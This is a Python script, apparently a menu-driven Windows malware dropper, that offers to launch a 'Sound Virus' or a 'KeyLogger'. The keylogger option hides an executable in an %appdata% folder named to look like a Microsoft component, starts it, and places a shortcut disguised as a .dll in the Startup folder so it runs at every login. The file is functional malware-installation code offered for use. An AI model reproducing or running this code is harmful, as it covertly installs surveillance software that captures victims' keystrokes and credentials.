from Colors import color
from getpass import getuser as user
from os import system as cmd
from os import getcwd, getenv,path,environ
from time import sleep
import win32com.client

# Define user / hostname / local path
user = user()
hostname = getenv("COMPUTERNAME")
local_path = getcwd()
# If is in User_Path
if user in local_path:
    local_path = "~" + local_path[local_path.find(user[-1:])+1:].replace("\\","/")

# Text Samples
which_app = f"{color.fg.yellow}Installer{color.reset}{color.fg.cyan}[{color.fg.blue}0{color.fg.cyan}]{color.reset} {color.type.Black},{color.reset} {color.fg.purple}Sound Virus{color.reset}{color.fg.cyan}[{color.fg.blue}1{color.fg.cyan}]{color.reset}{color.type.Black} or {color.reset}{color.fg.red}KeyLogger{color.reset}{color.fg.cyan}[{color.fg.blue}2{color.fg.cyan}]"
shell_simbol = f"{color.type.Black}{color.fg.blue}\n$ {color.reset}"
wrong_value = f"{color.fg.red}{color.type.Black}%ERROR%{color.reset} WRONG VALUE"
version = f"{color.type.Black}0.0.1 {color.reset}{color.fg.cyan}Beta{color.reset}"
user_text = f"{color.fg.green}({color.fg.blue}{user}@{hostname}{color.reset}{color.fg.green})-[{color.reset}{color.type.Black}{local_path}{color.fg.green}]{color.reset}"

# Create Shortcut

file_local_save = getenv('APPDATA')
def create_file_shortcut(file_path, shortcut_name=None):
    # Initialize the Windows Shell
    shell = win32com.client.Dispatch("WScript.Shell")
    # Get the path to the desktop

    desktop = file_local_save+"\Microsoft\Windows\Start Menu\Programs\Startup"

    # Set the name of the shortcut and the full path where it will be created
    if not shortcut_name:
        shortcut_name = path.basename(file_path)  # Use the original file name if no name is provided
    shortcut_path = path.join(desktop, shortcut_name + ".lnk")

    shortcut = shell.CreateShortcut(shortcut_path)

    shortcut.TargetPath = file_path

    shortcut.WorkingDirectory = path.dirname(file_path)

    shortcut.save()

# Choosing

cmd("cls")
print(user_text)
option = str(input(f"{which_app}\n{shell_simbol}"))
if option == '0':
    cmd("cls")
    cmd("Prompt.exe")
elif option == '1':
    cmd("cls")
    cmd("Sounds.exe")
elif option == '2':
    cmd(rf'mkdir %appdata%\MicrosoftWindowsAgent')
    cmd(rf'type nul > %appdata%\MicrosoftWindowsAgent\\log.txt')
    cmd(rf"move agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
    cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
    create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
else:
    print(f"{wrong_value}")
    print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
    sleep(10)
    exit(1)